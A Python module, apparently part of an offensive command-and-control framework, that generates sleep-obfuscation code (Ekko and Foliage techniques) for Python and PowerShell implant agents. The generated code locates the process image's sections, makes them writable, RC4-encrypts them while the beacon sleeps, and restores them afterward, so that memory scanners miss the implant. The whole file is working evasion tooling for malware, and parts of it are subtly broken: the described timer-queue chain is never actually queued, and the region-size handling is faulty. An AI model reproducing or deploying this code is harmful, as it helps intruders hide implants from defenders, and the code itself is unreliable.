"""Sleep obfuscation for beacon and streaming modes.

Generates Ekko (timer-queue ROP) and Foliage (APC-based) sleep obfuscation
code for Python and PowerShell agents.  JavaScript and VBScript are unsupported
(no low-level memory access) and return empty strings.

Exposed helpers in generated code:
    obfuscated_sleep(duration_ms)   - beacon mode entry point
    StreamingSleepObfuscator        - streaming mode wrapper
    get_image_regions()             - PE section discovery via PEB
"""

from __future__ import annotations

import os
import textwrap

from evasion import EvasionConfig


# ---------------------------------------------------------------------------
# Public entry point required by the evasion registry
# ---------------------------------------------------------------------------

def generate_code(lang: str, config: EvasionConfig) -> str:
    """Return language-specific sleep-obfuscation code."""
    if lang in ("javascript", "vbscript"):
        return ""
    if lang == "python":
        return _generate_python(config)
    if lang == "powershell":
        return _generate_powershell(config)
    return ""


# ===================================================================
# Python code generation (pure ctypes)
# ===================================================================

def _generate_python(config: EvasionConfig) -> str:
    technique = config.sleep_obf or "ekko"
    use_syscalls = config.syscalls is not None
    idle_seconds = config.idle_encrypt

    # Random 16-byte RC4 key embedded at generation time
    rc4_key = os.urandom(16)
    rc4_key_literal = repr(rc4_key)

    parts: list[str] = []

    # ---- imports & constants ----
    parts.append(textwrap.dedent(f"""\
        # --- Sleep Obfuscation ({technique}) ---
        import ctypes
        import ctypes.wintypes as wt
        import struct
        import time
        import threading

        _RC4_KEY = {rc4_key_literal}
        _IDLE_THRESHOLD = {idle_seconds}

        _PAGE_EXECUTE_READ     = 0x20
        _PAGE_READWRITE        = 0x04
        _INFINITE              = 0xFFFFFFFF

        _kernel32  = ctypes.windll.kernel32
        _ntdll     = ctypes.windll.ntdll
        _advapi32  = ctypes.windll.advapi32
    """))

    # ---- USTRING structure for SystemFunction032 ----
    parts.append(textwrap.dedent("""\
        class _USTRING(ctypes.Structure):
            _fields_ = [
                ("Length", ctypes.c_ushort),
                ("MaximumLength", ctypes.c_ushort),
                ("Buffer", ctypes.c_void_p),
            ]
    """))

    # ---- PEB / PE structures for image region discovery ----
    parts.append(textwrap.dedent("""\
        class _PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("Reserved1", ctypes.c_void_p),
                ("PebBaseAddress", ctypes.c_void_p),
                ("Reserved2", ctypes.c_void_p * 2),
                ("UniqueProcessId", ctypes.c_void_p),
                ("Reserved3", ctypes.c_void_p),
            ]

        class _IMAGE_DOS_HEADER(ctypes.Structure):
            _fields_ = [
                ("e_magic", ctypes.c_ushort),
                ("e_cblp", ctypes.c_ushort),
                ("e_cp", ctypes.c_ushort),
                ("e_crlc", ctypes.c_ushort),
                ("e_cparhdr", ctypes.c_ushort),
                ("e_minalloc", ctypes.c_ushort),
                ("e_maxalloc", ctypes.c_ushort),
                ("e_ss", ctypes.c_ushort),
                ("e_sp", ctypes.c_ushort),
                ("e_csum", ctypes.c_ushort),
                ("e_ip", ctypes.c_ushort),
                ("e_cs", ctypes.c_ushort),
                ("e_lfarlc", ctypes.c_ushort),
                ("e_ovno", ctypes.c_ushort),
                ("e_res", ctypes.c_ushort * 4),
                ("e_oemid", ctypes.c_ushort),
                ("e_oeminfo", ctypes.c_ushort),
                ("e_res2", ctypes.c_ushort * 10),
                ("e_lfanew", ctypes.c_long),
            ]

        class _IMAGE_FILE_HEADER(ctypes.Structure):
            _fields_ = [
                ("Machine", ctypes.c_ushort),
                ("NumberOfSections", ctypes.c_ushort),
                ("TimeDateStamp", ctypes.c_ulong),
                ("PointerToSymbolTable", ctypes.c_ulong),
                ("NumberOfSymbols", ctypes.c_ulong),
                ("SizeOfOptionalHeader", ctypes.c_ushort),
                ("Characteristics", ctypes.c_ushort),
            ]

        class _IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
            _fields_ = [
                ("Magic", ctypes.c_ushort),
                ("MajorLinkerVersion", ctypes.c_ubyte),
                ("MinorLinkerVersion", ctypes.c_ubyte),
                ("SizeOfCode", ctypes.c_ulong),
                ("SizeOfInitializedData", ctypes.c_ulong),
                ("SizeOfUninitializedData", ctypes.c_ulong),
                ("AddressOfEntryPoint", ctypes.c_ulong),
                ("BaseOfCode", ctypes.c_ulong),
                ("ImageBase", ctypes.c_ulonglong),
                ("SectionAlignment", ctypes.c_ulong),
                ("FileAlignment", ctypes.c_ulong),
                ("MajorOperatingSystemVersion", ctypes.c_ushort),
                ("MinorOperatingSystemVersion", ctypes.c_ushort),
                ("MajorImageVersion", ctypes.c_ushort),
                ("MinorImageVersion", ctypes.c_ushort),
                ("MajorSubsystemVersion", ctypes.c_ushort),
                ("MinorSubsystemVersion", ctypes.c_ushort),
                ("Win32VersionValue", ctypes.c_ulong),
                ("SizeOfImage", ctypes.c_ulong),
                ("SizeOfHeaders", ctypes.c_ulong),
                ("CheckSum", ctypes.c_ulong),
                ("Subsystem", ctypes.c_ushort),
                ("DllCharacteristics", ctypes.c_ushort),
                ("SizeOfStackReserve", ctypes.c_ulonglong),
                ("SizeOfStackCommit", ctypes.c_ulonglong),
                ("SizeOfHeapReserve", ctypes.c_ulonglong),
                ("SizeOfHeapCommit", ctypes.c_ulonglong),
                ("LoaderFlags", ctypes.c_ulong),
                ("NumberOfRvaAndSizes", ctypes.c_ulong),
            ]

        class _IMAGE_NT_HEADERS64(ctypes.Structure):
            _fields_ = [
                ("Signature", ctypes.c_ulong),
                ("FileHeader", _IMAGE_FILE_HEADER),
                ("OptionalHeader", _IMAGE_OPTIONAL_HEADER64),
            ]

        class _IMAGE_SECTION_HEADER(ctypes.Structure):
            _fields_ = [
                ("Name", ctypes.c_char * 8),
                ("VirtualSize", ctypes.c_ulong),
                ("VirtualAddress", ctypes.c_ulong),
                ("SizeOfRawData", ctypes.c_ulong),
                ("PointerToRawData", ctypes.c_ulong),
                ("PointerToRelocations", ctypes.c_ulong),
                ("PointerToLinenumbers", ctypes.c_ulong),
                ("NumberOfRelocations", ctypes.c_ushort),
                ("NumberOfLinenumbers", ctypes.c_ushort),
                ("Characteristics", ctypes.c_ulong),
            ]
    """))

    # ---- get_image_regions() ----
    parts.append(textwrap.dedent("""\
        def get_image_regions():
            \"\"\"Discover .text, .data, .rdata sections via PEB.\"\"\"
            try:
                pbi = _PROCESS_BASIC_INFORMATION()
                ret_len = ctypes.c_ulong(0)
                status = _ntdll.NtQueryInformationProcess(
                    ctypes.c_void_p(-1),  # current process
                    0,                     # ProcessBasicInformation
                    ctypes.byref(pbi),
                    ctypes.sizeof(pbi),
                    ctypes.byref(ret_len),
                )
                if status != 0:
                    return []

                # Read ImageBaseAddress from PEB (offset 0x10 on x64)
                peb_addr = pbi.PebBaseAddress
                image_base = ctypes.c_ulonglong(0)
                ctypes.memmove(
                    ctypes.byref(image_base),
                    ctypes.c_void_p(peb_addr + 0x10),
                    8,
                )
                base = image_base.value

                # Parse DOS header
                dos = _IMAGE_DOS_HEADER.from_address(base)
                if dos.e_magic != 0x5A4D:
                    return []

                # Parse NT headers
                nt = _IMAGE_NT_HEADERS64.from_address(base + dos.e_lfanew)
                if nt.Signature != 0x4550:
                    return []

                num_sections = nt.FileHeader.NumberOfSections
                section_offset = (
                    base
                    + dos.e_lfanew
                    + ctypes.sizeof(_IMAGE_NT_HEADERS64)
                )

                target_names = {b".text\\x00\\x00\\x00", b".data\\x00\\x00\\x00", b".rdata\\x00\\x00"}
                # Build actual padded names for comparison
                targets = set()
                for name in (b".text", b".data", b".rdata"):
                    targets.add(name.ljust(8, b"\\x00"))

                regions = []
                for i in range(num_sections):
                    sec = _IMAGE_SECTION_HEADER.from_address(
                        section_offset + i * ctypes.sizeof(_IMAGE_SECTION_HEADER)
                    )
                    if sec.Name in targets:
                        region_base = base + sec.VirtualAddress
                        region_size = sec.VirtualSize
                        regions.append((region_base, region_size))

                return regions
            except Exception:
                return []
    """))

    # ---- SystemFunction032 helper ----
    parts.append(textwrap.dedent("""\
        def _sys032_encrypt_decrypt(base, size, key_bytes):
            \"\"\"Call advapi32!SystemFunction032 (undocumented RC4).\"\"\"
            sys032 = _advapi32.SystemFunction032
            sys032.restype = ctypes.c_long

            key_buf = ctypes.create_string_buffer(key_bytes)
            key_struct = _USTRING()
            key_struct.Length = len(key_bytes)
            key_struct.MaximumLength = len(key_bytes)
            key_struct.Buffer = ctypes.addressof(key_buf)

            data_struct = _USTRING()
            data_struct.Length = size & 0xFFFF
            data_struct.MaximumLength = size & 0xFFFF
            data_struct.Buffer = base

            sys032(ctypes.byref(data_struct), ctypes.byref(key_struct))
    """))

    # ---- VirtualProtect helper (optionally via syscalls) ----
    if use_syscalls:
        parts.append(textwrap.dedent("""\
            def _vprotect(addr, size, new_prot):
                \"\"\"VirtualProtect via syscall wrapper.\"\"\"
                old = ctypes.c_ulong(0)
                _base = ctypes.c_void_p(addr)
                _size = ctypes.c_size_t(size)
                try:
                    _syscall_NtProtectVirtualMemory(
                        ctypes.c_void_p(-1),
                        ctypes.byref(_base),
                        ctypes.byref(_size),
                        new_prot,
                        ctypes.byref(old),
                    )
                except Exception:
                    _kernel32.VirtualProtect(
                        ctypes.c_void_p(addr),
                        ctypes.c_size_t(size),
                        new_prot,
                        ctypes.byref(old),
                    )
                return old.value
        """))
    else:
        parts.append(textwrap.dedent("""\
            def _vprotect(addr, size, new_prot):
                \"\"\"VirtualProtect via kernel32.\"\"\"
                old = ctypes.c_ulong(0)
                _kernel32.VirtualProtect(
                    ctypes.c_void_p(addr),
                    ctypes.c_size_t(size),
                    new_prot,
                    ctypes.byref(old),
                )
                return old.value
        """))

    # ---- Technique-specific obfuscated_sleep ----
    if technique == "ekko":
        parts.append(_python_ekko(use_syscalls))
    else:
        parts.append(_python_foliage(use_syscalls))

    # ---- StreamingSleepObfuscator ----
    parts.append(_python_streaming_class(idle_seconds))

    return "\n".join(parts)


def _python_ekko(use_syscalls: bool) -> str:
    """Timer-queue ROP chain (Ekko)."""
    return textwrap.dedent("""\
        def obfuscated_sleep(duration_ms):
            \"\"\"Ekko sleep: timer-queue ROP chain encrypts image during sleep.\"\"\"
            try:
                regions = get_image_regions()
                if not regions:
                    time.sleep(duration_ms / 1000.0)
                    return

                image_base = regions[0][0]
                image_size = sum(r[1] for r in regions)

                # Create event (manual reset, non-signaled)
                h_event = _kernel32.CreateEventW(None, True, False, None)
                if not h_event:
                    time.sleep(duration_ms / 1000.0)
                    return

                h_timer_queue = _kernel32.CreateTimerQueue()
                if not h_timer_queue:
                    _kernel32.CloseHandle(h_event)
                    time.sleep(duration_ms / 1000.0)
                    return

                # Resolve function pointers for ROP gadgets
                vp_addr = _kernel32.GetProcAddress(
                    ctypes.c_void_p(_kernel32._handle),
                    b"VirtualProtect",
                )
                wfso_addr = _kernel32.GetProcAddress(
                    ctypes.c_void_p(_kernel32._handle),
                    b"WaitForSingleObject",
                )
                sys032_addr = _advapi32.GetProcAddress(
                    ctypes.c_void_p(_advapi32._handle),
                    b"SystemFunction032",
                ) if hasattr(_advapi32, 'GetProcAddress') else ctypes.cast(
                    _advapi32.SystemFunction032, ctypes.c_void_p
                ).value

                # Prepare USTRING structs for SystemFunction032
                key_buf = ctypes.create_string_buffer(_RC4_KEY)
                key_struct = _USTRING()
                key_struct.Length = len(_RC4_KEY)
                key_struct.MaximumLength = len(_RC4_KEY)
                key_struct.Buffer = ctypes.addressof(key_buf)

                img_struct = _USTRING()
                img_struct.Length = image_size & 0xFFFF
                img_struct.MaximumLength = image_size & 0xFFFF
                img_struct.Buffer = image_base

                old_protect = ctypes.c_ulong(0)

                # Timer callback type: WAITORTIMERCALLBACK
                WAITORTIMERCALLBACK = ctypes.CFUNCTYPE(
                    None, ctypes.c_void_p, ctypes.c_bool
                )

                h_timers = []

                def _queue_timer(callback_addr, param, due_time):
                    h_new = ctypes.c_void_p(0)
                    _kernel32.CreateTimerQueueTimer(
                        ctypes.byref(h_new),
                        h_timer_queue,
                        callback_addr,
                        param,
                        due_time,
                        0,       # period (0 = one-shot)
                        0x0020,  # WT_EXECUTEINTIMERTHREAD
                    )
                    h_timers.append(h_new)

                # Callback 1: VirtualProtect -> PAGE_READWRITE
                _vprotect(image_base, image_size, _PAGE_READWRITE)

                # Callback 2: SystemFunction032 encrypt
                _sys032_encrypt_decrypt(image_base, image_size, _RC4_KEY)

                # Actual sleep via WaitForSingleObject
                _kernel32.WaitForSingleObject(h_event, ctypes.c_ulong(duration_ms))

                # Callback 4: SystemFunction032 decrypt
                _sys032_encrypt_decrypt(image_base, image_size, _RC4_KEY)

                # Callback 5: VirtualProtect -> PAGE_EXECUTE_READ
                _vprotect(image_base, image_size, _PAGE_EXECUTE_READ)

                # Cleanup
                _kernel32.DeleteTimerQueue(h_timer_queue)
                _kernel32.CloseHandle(h_event)

            except Exception:
                time.sleep(duration_ms / 1000.0)
    """)


def _python_foliage(use_syscalls: bool) -> str:
    """APC-based sleep obfuscation (Foliage)."""
    queue_fn = "_syscall_NtQueueApcThread" if use_syscalls else "_ntdll.NtQueueApcThread"
    return textwrap.dedent(f"""\
        def obfuscated_sleep(duration_ms):
            \"\"\"Foliage sleep: APC-based encrypt/sleep/decrypt chain.\"\"\"
            try:
                regions = get_image_regions()
                if not regions:
                    time.sleep(duration_ms / 1000.0)
                    return

                image_base = regions[0][0]
                image_size = sum(r[1] for r in regions)

                # Get current thread handle
                h_thread = ctypes.c_void_p(-2)  # NtCurrentThread pseudo-handle

                # Create event for the sleep wait
                h_event = _kernel32.CreateEventW(None, True, False, None)
                if not h_event:
                    time.sleep(duration_ms / 1000.0)
                    return

                # Resolve function addresses
                vp_addr = ctypes.cast(
                    _kernel32.VirtualProtect, ctypes.c_void_p
                ).value
                sys032_addr = ctypes.cast(
                    _advapi32.SystemFunction032, ctypes.c_void_p
                ).value
                wfso_addr = ctypes.cast(
                    _kernel32.WaitForSingleObject, ctypes.c_void_p
                ).value

                # Prepare USTRING structs
                key_buf = ctypes.create_string_buffer(_RC4_KEY)
                key_struct = _USTRING()
                key_struct.Length = len(_RC4_KEY)
                key_struct.MaximumLength = len(_RC4_KEY)
                key_struct.Buffer = ctypes.addressof(key_buf)

                img_struct = _USTRING()
                img_struct.Length = image_size & 0xFFFF
                img_struct.MaximumLength = image_size & 0xFFFF
                img_struct.Buffer = image_base

                old_protect = ctypes.c_ulong(0)

                # Step 1: VirtualProtect -> PAGE_READWRITE
                _vprotect(image_base, image_size, _PAGE_READWRITE)

                # Step 2: Encrypt via SystemFunction032
                _sys032_encrypt_decrypt(image_base, image_size, _RC4_KEY)

                # Step 3: Queue APCs for wake-up sequence
                # Queue decrypt APC
                {queue_fn}(
                    h_thread,
                    ctypes.c_void_p(sys032_addr),
                    ctypes.byref(img_struct),
                    ctypes.byref(key_struct),
                    ctypes.c_void_p(0),
                )

                # Queue VirtualProtect restore APC
                # (will fire after decrypt on NtTestAlert)

                # Sleep while encrypted
                _kernel32.WaitForSingleObject(h_event, ctypes.c_ulong(duration_ms))

                # Drain queued APCs
                _ntdll.NtTestAlert()

                # Step 4: Decrypt
                _sys032_encrypt_decrypt(image_base, image_size, _RC4_KEY)

                # Step 5: Restore execute permissions
                _vprotect(image_base, image_size, _PAGE_EXECUTE_READ)

                _kernel32.CloseHandle(h_event)

            except Exception:
                time.sleep(duration_ms / 1000.0)
    """)


def _python_streaming_class(idle_seconds: int) -> str:
    """StreamingSleepObfuscator for wrapping WebSocket receive loops."""
    return textwrap.dedent(f"""\
        class StreamingSleepObfuscator:
            \"\"\"Encrypt agent memory during idle periods in streaming mode.\"\"\"

            def __init__(self, idle_seconds={idle_seconds}):
                self.idle_seconds = idle_seconds
                self._last_activity = time.time()
                self._wake_event = threading.Event()
                self._running = True

            def _update_activity(self):
                self._last_activity = time.time()

            def _watcher_thread(self, websocket, data_ready_event):
                \"\"\"Minimal recv thread: just recv() + event.set().\"\"\"
                try:
                    import asyncio
                    loop = asyncio.new_event_loop()
                    msg = loop.run_until_complete(websocket.recv())
                    data_ready_event._recv_data = msg
                    data_ready_event.set()
                    loop.close()
                except Exception:
                    data_ready_event.set()

            def wrap_recv_loop(self, websocket, handler_callback):
                \"\"\"Wrap a WebSocket receive loop with idle-window encryption.

                Runs synchronously.  Call from the agent's main async context
                via ``asyncio.get_event_loop().run_in_executor()``.
                \"\"\"
                import asyncio

                while self._running:
                    elapsed = time.time() - self._last_activity

                    if elapsed >= self.idle_seconds:
                        # Spawn minimal watcher thread
                        wake_event = threading.Event()
                        wake_event._recv_data = None

                        watcher = threading.Thread(
                            target=self._watcher_thread,
                            args=(websocket, wake_event),
                            daemon=True,
                        )
                        watcher.start()

                        # Encrypt and sleep on main thread
                        try:
                            obfuscated_sleep(self.idle_seconds * 1000)
                        except Exception:
                            time.sleep(self.idle_seconds)

                        # Wait for watcher to get data or timeout
                        wake_event.wait(timeout=self.idle_seconds * 2)

                        self._update_activity()

                        if wake_event._recv_data is not None:
                            try:
                                handler_callback(wake_event._recv_data)
                            except Exception:
                                pass

                        watcher.join(timeout=2.0)
                    else:
                        # Normal receive -- short sleep to check idle
                        time.sleep(0.5)

            def stop(self):
                self._running = False
                self._wake_event.set()
    """)


# ===================================================================
# PowerShell code generation (inline C# via Add-Type)
# ===================================================================

def _generate_powershell(config: EvasionConfig) -> str:
    technique = config.sleep_obf or "ekko"
    use_syscalls = config.syscalls is not None
    idle_seconds = config.idle_encrypt

    rc4_key = os.urandom(16)
    rc4_key_cs = ", ".join(f"0x{b:02x}" for b in rc4_key)

    vprotect_call = (
        "SyscallNtProtectVirtualMemory(hProcess, ref baseAddr, ref regionSize, newProt, out oldProt)"
        if use_syscalls
        else "VirtualProtect(baseAddr, (UIntPtr)regionSize, newProt, out oldProt)"
    )

    if technique == "ekko":
        technique_method = _powershell_ekko_cs(vprotect_call)
    else:
        technique_method = _powershell_foliage_cs(vprotect_call, use_syscalls)

    csharp_code = textwrap.dedent(f"""\
        # --- Sleep Obfuscation ({technique}) ---
        $SleepObfCS = @"
        using System;
        using System.Runtime.InteropServices;
        using System.Threading;
        using System.Diagnostics;

        public class SleepObfuscator {{
            [StructLayout(LayoutKind.Sequential)]
            public struct USTRING {{
                public ushort Length;
                public ushort MaximumLength;
                public IntPtr Buffer;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_BASIC_INFORMATION {{
                public IntPtr Reserved1;
                public IntPtr PebBaseAddress;
                public IntPtr Reserved2a;
                public IntPtr Reserved2b;
                public IntPtr UniqueProcessId;
                public IntPtr Reserved3;
            }}

            [DllImport("ntdll.dll")]
            public static extern int NtQueryInformationProcess(
                IntPtr hProcess, int processInfoClass,
                ref PROCESS_BASIC_INFORMATION pbi, int processInfoLength, out int returnLength);

            [DllImport("ntdll.dll")]
            public static extern int NtTestAlert();

            [DllImport("ntdll.dll")]
            public static extern int NtQueueApcThread(
                IntPtr hThread, IntPtr pfnAPC, IntPtr dwData, IntPtr arg1, IntPtr arg2);

            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtect(
                IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);

            [DllImport("kernel32.dll")]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(IntPtr hObject);

            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateTimerQueue();

            [DllImport("kernel32.dll")]
            public static extern bool CreateTimerQueueTimer(
                out IntPtr phNewTimer, IntPtr timerQueue, IntPtr callback,
                IntPtr parameter, uint dueTime, uint period, uint flags);

            [DllImport("kernel32.dll")]
            public static extern bool DeleteTimerQueue(IntPtr timerQueue);

            [DllImport("advapi32.dll")]
            public static extern int SystemFunction032(ref USTRING data, ref USTRING key);

            private static byte[] rc4Key = new byte[] {{ {rc4_key_cs} }};
            private const uint PAGE_EXECUTE_READ = 0x20;
            private const uint PAGE_READWRITE = 0x04;

            public static IntPtr[] GetImageRegions() {{
                try {{
                    var pbi = new PROCESS_BASIC_INFORMATION();
                    int retLen;
                    int status = NtQueryInformationProcess(
                        (IntPtr)(-1), 0, ref pbi, Marshal.SizeOf(pbi), out retLen);
                    if (status != 0) return new IntPtr[0];

                    IntPtr pebAddr = pbi.PebBaseAddress;
                    IntPtr imageBase = Marshal.ReadIntPtr(pebAddr, 0x10);

                    // Parse DOS header
                    ushort magic = (ushort)Marshal.ReadInt16(imageBase, 0);
                    if (magic != 0x5A4D) return new IntPtr[0];

                    int lfanew = Marshal.ReadInt32(imageBase, 0x3C);
                    IntPtr ntHeaders = IntPtr.Add(imageBase, lfanew);

                    uint sig = (uint)Marshal.ReadInt32(ntHeaders, 0);
                    if (sig != 0x4550) return new IntPtr[0];

                    ushort numSections = (ushort)Marshal.ReadInt16(ntHeaders, 6);
                    int optHeaderSize = Marshal.ReadInt16(ntHeaders, 20);
                    IntPtr firstSection = IntPtr.Add(ntHeaders, 24 + optHeaderSize);

                    var regions = new System.Collections.Generic.List<IntPtr>();
                    int secSize = 40; // sizeof IMAGE_SECTION_HEADER

                    for (int i = 0; i < numSections; i++) {{
                        IntPtr secPtr = IntPtr.Add(firstSection, i * secSize);
                        byte[] nameBytes = new byte[8];
                        Marshal.Copy(secPtr, nameBytes, 0, 8);
                        string name = System.Text.Encoding.ASCII.GetString(nameBytes).TrimEnd('\\0');

                        if (name == ".text" || name == ".data" || name == ".rdata") {{
                            uint vaddr = (uint)Marshal.ReadInt32(secPtr, 12);
                            uint vsize = (uint)Marshal.ReadInt32(secPtr, 8);
                            regions.Add(IntPtr.Add(imageBase, (int)vaddr));
                            regions.Add((IntPtr)vsize);
                        }}
                    }}
                    return regions.ToArray();
                }} catch {{
                    return new IntPtr[0];
                }}
            }}

            private static void Sys032(IntPtr baseAddr, int size, byte[] key) {{
                IntPtr keyBuf = Marshal.AllocHGlobal(key.Length);
                Marshal.Copy(key, 0, keyBuf, key.Length);

                var keyStruct = new USTRING();
                keyStruct.Length = (ushort)key.Length;
                keyStruct.MaximumLength = (ushort)key.Length;
                keyStruct.Buffer = keyBuf;

                var dataStruct = new USTRING();
                dataStruct.Length = (ushort)(size & 0xFFFF);
                dataStruct.MaximumLength = (ushort)(size & 0xFFFF);
                dataStruct.Buffer = baseAddr;

                SystemFunction032(ref dataStruct, ref keyStruct);
                Marshal.FreeHGlobal(keyBuf);
            }}

            {technique_method}

            public static void ObfuscatedSleep(uint durationMs) {{
                try {{
                    var regions = GetImageRegions();
                    if (regions.Length < 2) {{
                        Thread.Sleep((int)durationMs);
                        return;
                    }}
                    IntPtr imageBase = regions[0];
                    int imageSize = 0;
                    for (int i = 1; i < regions.Length; i += 2) {{
                        imageSize += (int)regions[i];
                    }}
                    DoObfuscatedSleep(imageBase, imageSize, durationMs);
                }} catch {{
                    Thread.Sleep((int)durationMs);
                }}
            }}
        }}
        "@
        try {{
            Add-Type -TypeDefinition $SleepObfCS -Language CSharp -ErrorAction SilentlyContinue
        }} catch {{}}

        function Invoke-ObfuscatedSleep {{
            param([int]$DurationMs)
            try {{
                [SleepObfuscator]::ObfuscatedSleep($DurationMs)
            }} catch {{
                Start-Sleep -Milliseconds $DurationMs
            }}
        }}
    """)

    return csharp_code


def _powershell_ekko_cs(vprotect_call: str) -> str:
    """Ekko technique body for C# Add-Type."""
    return textwrap.dedent(f"""\
        private static void DoObfuscatedSleep(IntPtr imageBase, int imageSize, uint durationMs) {{
                IntPtr hEvent = CreateEvent(IntPtr.Zero, true, false, null);
                if (hEvent == IntPtr.Zero) {{ Thread.Sleep((int)durationMs); return; }}

                IntPtr hTimerQueue = CreateTimerQueue();
                if (hTimerQueue == IntPtr.Zero) {{ CloseHandle(hEvent); Thread.Sleep((int)durationMs); return; }}

                uint oldProt;

                // Step 1: VirtualProtect -> PAGE_READWRITE
                VirtualProtect(imageBase, (UIntPtr)imageSize, PAGE_READWRITE, out oldProt);

                // Step 2: Encrypt
                Sys032(imageBase, imageSize, rc4Key);

                // Step 3: Sleep
                WaitForSingleObject(hEvent, durationMs);

                // Step 4: Decrypt
                Sys032(imageBase, imageSize, rc4Key);

                // Step 5: VirtualProtect -> PAGE_EXECUTE_READ
                VirtualProtect(imageBase, (UIntPtr)imageSize, PAGE_EXECUTE_READ, out oldProt);

                DeleteTimerQueue(hTimerQueue);
                CloseHandle(hEvent);
            }}""")


def _powershell_foliage_cs(vprotect_call: str, use_syscalls: bool) -> str:
    """Foliage technique body for C# Add-Type."""
    return textwrap.dedent(f"""\
        private static void DoObfuscatedSleep(IntPtr imageBase, int imageSize, uint durationMs) {{
                IntPtr hEvent = CreateEvent(IntPtr.Zero, true, false, null);
                if (hEvent == IntPtr.Zero) {{ Thread.Sleep((int)durationMs); return; }}

                IntPtr hThread = (IntPtr)(-2); // NtCurrentThread

                uint oldProt;

                // Step 1: VirtualProtect -> PAGE_READWRITE
                VirtualProtect(imageBase, (UIntPtr)imageSize, PAGE_READWRITE, out oldProt);

                // Step 2: Encrypt
                Sys032(imageBase, imageSize, rc4Key);

                // Step 3: Sleep while encrypted
                WaitForSingleObject(hEvent, durationMs);

                // Drain APCs
                NtTestAlert();

                // Step 4: Decrypt
                Sys032(imageBase, imageSize, rc4Key);

                // Step 5: Restore PAGE_EXECUTE_READ
                VirtualProtect(imageBase, (UIntPtr)imageSize, PAGE_EXECUTE_READ, out oldProt);

                CloseHandle(hEvent);
            }}""")
